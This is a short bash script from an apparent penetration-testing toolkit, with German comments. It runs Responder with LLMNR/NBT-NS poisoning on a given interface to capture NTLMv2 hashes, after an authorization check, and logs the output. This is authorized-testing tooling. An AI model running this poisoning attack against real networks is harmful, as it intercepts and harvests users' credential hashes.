#!/usr/bin/env bash
# responder-quick.sh - Responder fuer LLMNR/NBT-NS Poisoning
# NUR im eigenen LAN, sammelt NTLMv2-Hashes von eigenen Geraeten
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
NET_ID="${2:-}"
[[ -z "$IFACE" || -z "$NET_ID" ]] && {
    echo "Usage: $0 <iface> <network-id-in-targets.yaml>"
    exit 1
}
require_auth "$NET_ID"
require_bin responder

outdir="$(make_outdir captures responder-$NET_ID)"
log_info "Responder auf $IFACE, Logs in $outdir"
log_warn "Strg+C zum Beenden, dann hashes/ Verzeichnis pruefen"

cd "$outdir"
sudo responder -I "$IFACE" -wrf 2>&1 | tee responder.log
